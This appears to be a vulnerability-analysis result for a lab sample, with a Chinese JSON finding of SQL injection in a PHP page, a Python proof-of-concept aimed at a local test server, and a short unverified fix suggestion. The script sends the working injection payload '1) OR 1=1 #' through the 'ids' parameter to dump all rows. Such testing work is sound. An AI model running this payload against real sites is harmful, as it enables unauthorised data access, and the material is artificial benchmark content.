@@ -1,0 +1,48 @@
+```json
+{"sample_id":"S009","prediction":"vulnerable","vulnerability_type":"SQL注入","locations":["F01:0008","F01:0013","F01:0015"],"evidence":{"source":"F01:0008 从 GET 读取 ids 并仅做 trim","flow":"F01:0013 将 $idsRaw 原样拼入 WHERE id IN ($idsRaw)","guard":"无效：无预处理绑定、整数校验或 SQL 结构白名单；trim 和 HTML 转义不防护 SQL 注入","sink":"F01:0015 $db->query($sql) 可达执行拼接后的 SQL"},"prerequisites":["Web 服务监听 127.0.0.1:4280 并可访问该 PHP 页面","bootstrap.php 提供已连接的 mysqli 连接 $db","lab_people 已预置 id/name：1 Alice、2 Bob、3 Carol","GET 参数 ids 可传入且页面正常执行查询分支"],"missing_context":["bootstrap.php 的具体数据库连接配置未在代码中给出，但运行上下文声明 $db 已连接"],"poc_generated":true,"poc_language":"python3","poc_instructions":"运行 python3 poc_s009.py。默认目标 http://127.0.0.1:4280/。脚本先请求 ids=1（预期仅 Alice），再请求 ids=999（预期显示未找到匹配记录），最后请求 ids=1) OR 1=1 #（URL 编码后发送；预期显示 Alice/Bob/Carol）。不以 HTTP 200 作为成功条件，而是比较页面记录文本。若失败，检查服务端口、bootstrap 数据库连接、lab_people 预置数据及实际页面路径。"}
+```
+
+```python
+import sys
+import urllib.parse
+import urllib.request
+
+BASE = "http://127.0.0.1:4280/"
+
+
+def fetch(ids_value: str) -> str:
+    query = urllib.parse.urlencode({"ids": ids_value})
+    url = BASE + "?" + query
+    with urllib.request.urlopen(url, timeout=5) as resp:
+        return resp.read().decode("utf-8", "replace")
+
+
+def main() -> int:
+    normal = fetch("1")
+    control = fetch("999")
+    payload = "1) OR 1=1 #"
+    injected = fetch(payload)
+
+    ok_normal = ("Alice" in normal) and ("Bob" not in normal) and ("Carol" not in normal)
+    ok_control = "未找到匹配记录" in control
+    ok_injected = all(name in injected for name in ("Alice", "Bob", "Carol"))
+
+    print("普通输入 ids=1：预期仅 Alice；实际包含 Alice =", "Alice" in normal)
+    print("对照输入 ids=999：预期未找到；实际含未找到提示 =", ok_control)
+    print("测试输入 ids=1) OR 1=1 #：预期 Alice/Bob/Carol 均出现 =", ok_injected)
+
+    if not ok_normal:
+        print("普通输入未符合预期，检查页面路径、数据库连接或 lab_people 数据。")
+    if not ok_control:
+        print("对照输入未符合预期，检查空结果页面文本或查询是否异常。")
+    if not ok_injected:
+        print("注入测试未符合预期，检查服务端是否实际执行该代码、MySQL 版本/注释语法及查询错误日志。")
+
+    return 0 if (ok_normal and ok_control and ok_injected) else 1
+
+
+if __name__ == "__main__":
+    sys.exit(main())
+```
+
+防护建议（未验证）：将 ids 按逗号拆分后逐项校验为整数，并使用预处理/绑定参数构造 IN 占位符；不要将原始 GET 值直接拼入 SQL。
